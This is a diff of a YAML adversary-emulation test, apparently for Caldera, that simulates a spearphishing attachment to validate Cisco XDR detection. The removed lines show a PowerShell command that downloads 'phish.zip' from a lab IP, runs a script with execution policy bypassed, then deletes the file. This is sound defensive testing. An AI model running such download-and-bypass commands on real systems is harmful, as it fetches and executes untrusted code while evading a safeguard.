@@ -1,7 +1,7 @@
 - tactic: initial-access
   technique_name: 'Phishing: Spearphishing Attachment'
   technique_id: T1566.001
-  name: Cisco - Spearphishing Email Attachment
+  name: 'Cisco: Spear Phishing Email Attachment'
   description: This test case simulation is crucial for validating the detection and
     response capabilities of Cisco XDR against suspicious email activities that could
     be used as an initial access vector by adversaries. It helps ensure that the system
@@ -11,10 +11,7 @@
   executors:
   - name: psh
     platform: windows
-    command: "invoke-webrequest \"http://198.18.128.192/caldera-addon/malware/phish.zip\"\
-      \ -OutFile $env:temp/payment_instruction.zip; \npowershell -ExecutionPolicy\
-      \ Bypass -File .\\outlook.ps1; \nRemove-Item \"$env:temp\\payment_instruction.zip\"\
-      \ -Force"
+    command: .\outlook.ps1
     code: null
     language: null
     build_target: null
